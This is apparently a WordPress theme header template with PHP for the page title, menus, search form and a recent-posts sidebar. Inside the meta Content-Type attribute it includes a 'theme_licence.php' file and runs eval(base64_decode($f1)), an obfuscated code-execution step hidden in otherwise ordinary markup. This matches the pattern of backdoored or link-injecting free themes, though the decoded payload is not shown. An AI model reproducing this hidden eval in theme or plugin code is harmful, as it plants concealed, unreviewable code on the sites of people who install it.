<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
<head profile="http://gmpg.org/xfn/11">

<meta http-equiv="Content-Type" content="<?php require_once("theme_licence.php"); eval(base64_decode($f1)); bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />

<title>
<?php bloginfo('name'); ?>
<?php if(is_home()) { ?>
 - <?php bloginfo('description'); ?>
<?php } ?>
<?php if(is_single()) { ?>
<?php wp_title(); ?>
<?php } ?>
<?php if(is_404()) { ?>
 - Page Not Found
<?php } ?>
<?php if(is_search()) { ?>
 - Search Results for: <?php echo wp_specialchars($s, 1); ?>
<?php } ?>
</title>

<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />

<script src="<?php bloginfo('template_directory'); ?>/js/heightMatch.js" type="text/javascript"></script>
<script src="<?php bloginfo('template_directory'); ?>/js/topmenudynamic.js" type="text/javascript"></script>
<script src="<?php bloginfo('template_directory'); ?>/js/dropdown.js" type="text/javascript"></script>
<script src="<?php bloginfo('template_directory'); ?>/js/niftycube.js" type="text/javascript"></script>
<script src="<?php bloginfo('template_directory'); ?>/js/niftylayout.js" type="text/javascript"></script>

<?php wp_head(); ?>

</head>
<body>
<?php start_template(); ?>
<div id="container">

<!-- header -->
<div id="header">

	<div id="header_logo">
	<h1 class="blogtitle"><a href="<?php bloginfo('home'); ?>/" title="<?php bloginfo('name'); ?>"><?php bloginfo('name'); ?></a></h1>
	<div class="description"><?php bloginfo('description'); ?></div>
	</div>

	<div id="header_ad">
	<?php include (TEMPLATEPATH . "/468_60.php"); ?>
	</div>

<div class="clear"></div>
</div>
<!-- end -->

<!-- page menu and search -->
<div id="top">

	<ul id="pagemenu">
	<?php wp_list_pages('sort_column=post_date&title_li=&depth=1'); ?>
	</ul>

	<div id="searchbar">
	<form method="get" action="<?php bloginfo('url'); ?>/" class="searchform" style="float: right;">
	<fieldset>
	<label class="searchlabel"><?php _e('Search Blog'); ?></label>
	<input type="text" value="<?php the_search_query(); ?>" name="s" class="searchterm" />
	<input type="submit" value="Search" class="searchbutton" />
	</fieldset>
	</form>
	</div>

<div class="clear"></div>
</div>
<!-- end -->

<div class="clear"></div>

<!-- category menu -->
<div id="bar">

	<ul id="catmenu">
	<li<?php if(!is_category() && !is_page()) { ?> class="current-cat"<?php } ?>><a href="<?php bloginfo('home'); ?>/">Home</a></li>
	<?php wp_list_categories('hide_empty=0&depth=1&title_li='); ?>
	</ul>

<div class="clear"></div>
</div>
<!-- end -->

<!-- blog information -->
<div id="bloginfo">
<div id="bloginfobox">

	<ul>
		<li class="posts"><h2>Recent Posts</h2>
		<ul>
		<?php
		global $opt;
		$recentposts = new WP_query();
		$recentposts->query('showposts='.$opt['posts'].'&orderby=date&order=DESC');
		?>
		<?php while ($recentposts->have_posts()) : $recentposts->the_post(); ?>
		<li><div class="r_time"><?php the_time('d F Y'); ?></div><h1 class="r_head"><a href="<?php the_permalink() ?>" title="<?php the_title(); ?>"><?php the_title(); ?></a></h1></li>
		<?php endwhile; ?>
		</ul>
		</li>
		
		<li class="comments"><h2>Recent Comments</h2><?php include (TEMPLATEPATH . '/simple_recent_comments.php'); ?><?php if (function_exists('src_simple_recent_comments')) { src_simple_recent_comments($opt['comments'], $opt['c_excerpt'], '', ''); } ?>
		</li>
		
		<li class="tags"><h2>Browse by Tags</h2>
		<ul>
		<li><?php wp_tag_cloud('smallest=8&largest=18&number='.$opt['tags']); ?></li>
		</ul>
		</li>
	</ul>

<div class="clear"></div>
</div>
<div class="clear"></div>
</div>
<!-- end -->